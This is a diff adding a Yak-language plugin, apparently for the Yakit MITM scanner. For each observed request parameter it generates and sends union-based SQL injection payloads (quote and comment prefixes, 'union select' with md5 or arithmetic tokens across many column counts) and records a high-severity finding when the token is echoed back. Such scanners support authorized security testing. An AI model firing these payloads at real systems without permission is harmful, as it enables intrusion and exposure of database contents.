@@ -1,0 +1,172 @@
+yakit.AutoInitYakit()
+yakit_output(MITM_PARAMS)
+
+/* 生成一个计算表达式，一般用来检测强制类型转换是否生效的 */
+generateIntCastCheckingExpr = func(i) {
+    paramInt = atoi(i)~
+    randInt = randn(100, 300)
+    expr = f`${randInt+paramInt}-${randInt}`
+    return expr
+}
+
+unionPayloads = func(checkType) {
+    exprInfo = fuzz.FuzzCalcExpr()
+    expr = exprInfo.expr
+
+    token = exprInfo.result
+    basicItem = expr
+    if str.TrimSpace(checkType).Lower() == "md5" {
+        basicItem = `md5(%v)` % expr
+        token = codec.Md5(exprInfo.result)
+    }
+
+    yakit.Info("USE UnionItem: %v token: %v", basicItem, token)
+
+    // base
+    var payloads = []
+    for in 3 {
+        payloads.Push(sprint(basicItem))
+    }
+
+    var results = []
+    for i in 16 {
+        payloads.Push(basicItem)
+        realPayload = "union select %v" % str.Join(payloads, ",")
+        results.Push(realPayload)
+    }
+    return results, token
+}
+
+sqlInjectionChecking = func(https, request) {
+    freq = fuzz.HTTPRequest(request, fuzz.https(https))~
+    params = freq.GetCommonParams()
+    url = str.ExtractURLFromHTTPRequestRaw(request, https)~.String()
+    if len(params) <= 0 {
+        return
+    }
+
+    yakit.Info("准备对 %v 进行 SQL 注入检查", url)
+    info = i => {
+        yakit.Info("检测URL: %v - %v", url, i)
+    }
+
+    /* 开始根据参数进行检测 */
+    for i in params {
+        paramName = i.Name()
+        paramValue = freq.GetQueryValue(paramName)
+
+        info(f`参数名：${paramName} 参数值: ${paramValue}`)
+        pureInt = str.MatchAllOfRegexp(paramValue, `\d+`)
+
+        prefix = []
+        suffix = [" -- ", " # "]
+        if pureInt {
+            prefix.Push(" ", "/**/")
+            prefix.Push(sprint(paramValue) + " ")
+            prefix.Push(sprint(paramValue) + "/**/")
+        } else {
+            info("开始进行字符串检测")
+            prefix.Push("'", "')")
+            prefix.Push(sprint(paramValue) + "'")
+            prefix.Push(sprint(paramValue) + "')")
+            prefix.Push(sprint(randstr(10)) + "'")
+            prefix.Push(sprint(randstr(10)) + "')")
+        }
+
+        payloads, token = unionPayloads("md5")
+        token = sprint(token)
+        info(f"Payload: ${len(payloads)} Prefix:${len(prefix)} Suffix:${len(suffix)} TOKEN 为 " + sprint(token))
+
+        /* 最准确的 MD5 型 Payload 的检测 */
+        var finished = false
+        for p in prefix {
+            for s in suffix {
+                if finished {
+                    info("Detected Finished")
+                    return
+                }
+
+                for payload in payloads {
+                    finPayload = p + payload + s
+                    info(f"USE: prefix:${p} suffix:${s} payloads: ${sdump(payload)}")
+                    rsp, err := i.Fuzz(finPayload).ExecFirst()
+                    if err != nil {
+                        info("FAILED: %v" % err)
+                        continue
+                    }
+                    _, body = poc.Split(rsp.ResponseRaw)
+                    bodyStr = string(body)
+                    // println(bodyStr)
+                    if bodyStr.Contains(token) {
+                        info("Union Checking Token 生效了，Payload 为：" + finPayload)
+                        count = payload.Count(",") + 1
+                        risk.NewRisk(
+                            url,
+                            risk.title(f"UNION SQL Injection Columns(MD5)[${count}] For: ${url}"),
+                            risk.title(f"SQL注入（UNION）列数(MD5)[${count}] URL: ${url}"),
+                            risk.type("sqlinjection"),
+                            risk.severity("high"),
+                            risk.request(rsp.RequestRaw),
+                            risk.parameter(i.String()),
+                            risk.response(rsp.ResponseRaw),
+                            risk.payload(finPayload),
+                            risk.description("Union-Based SQL 注入是一种常见的 SQL 注入攻击技术，通过在应用程序的查询语句中使用 UNION 操作符来获取数据库中的敏感信息。攻击者利用 UNION 操作符将恶意的 SELECT 查询与正常的查询结果合并，从而泄露数据库的数据。本漏洞检测方式是，使用 UNION Select 表达式的md5计算结果作为检测依据。"),
+                            risk.solution("使用参数化查询,使用 ORM（对象关系映射）框架,进行输入验证和过滤,代码遵循最小权限原则"),
+                            risk.details("通过 UNION SELECT 随机 Token 为测试手段，测出回显列数然后在响应结果中找到 Token"),
+                        )
+                        finished = true
+                    }
+                }
+            }
+        }
+
+        plainPayloads, token = unionPayloads("")
+        token = sprint(token)
+        info(f"Payload: ${len(payloads)} Prefix:${len(prefix)} Suffix:${len(suffix)} TOKEN 为 " + sprint(token))
+        for p in prefix {
+            for s in suffix {
+                if finished {
+                    info("Detected Finished")
+                    return
+                }
+
+                for payload in plainPayloads {
+                    finPayload = p + payload + s
+                    info(f"USE: prefix:${p} suffix:${s} payloads: ${sdump(payload)}")
+                    rsp, err := i.Fuzz(finPayload).ExecFirst()
+                    if err != nil {
+                        info("FAILED: %v" % err)
+                        continue
+                    }
+                    _, body = poc.Split(rsp.ResponseRaw)
+                    bodyStr = string(body)
+                    // println(bodyStr)
+                    if bodyStr.Contains(token) {
+                        info("Union Checking Token 生效了，Payload 为：" + finPayload)
+                        count = payload.Count(",") + 1
+                        risk.NewRisk(
+                            url,
+                            risk.title(f"UNION SQL Injection Columns(数值计算)[${count}] For: ${url}"),
+                            risk.title(f"SQL注入（UNION）列数(数值计算)[${count}] URL: ${url}"),
+                            risk.type("sqlinjection"),
+                            risk.severity("high"),
+                            risk.request(rsp.RequestRaw),
+                            risk.response(rsp.ResponseRaw),
+                            risk.payload(finPayload),
+                            risk.parameter(i.String()),
+                            risk.description("Union-Based SQL 注入是一种常见的 SQL 注入攻击技术，通过在应用程序的查询语句中使用 UNION 操作符来获取数据库中的敏感信息。攻击者利用 UNION 操作符将恶意的 SELECT 查询与正常的查询结果合并，从而泄露数据库的数据。本漏洞检测方式是，使用 UNION Select 表达式的数据计算结果作为检测依据。"),
+                            risk.solution("使用参数化查询,使用 ORM（对象关系映射）框架,进行输入验证和过滤,代码遵循最小权限原则"),
+                            risk.details("通过 UNION SELECT 随机 Token 为测试手段，测出回显列数然后在响应结果中找到 Token"),
+                        )
+                        finished = true
+                    }
+                }
+            }
+        }
+    }
+}
+
+# mirrorNewWebsitePathParams 每新出现一个网站路径且带有一些参数，参数通过常见位置和参数名去重，去重的第一个 HTTPFlow 在这里被调用
+mirrorNewWebsitePathParams = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
+    sqlInjectionChecking(isHttps, req)
+}
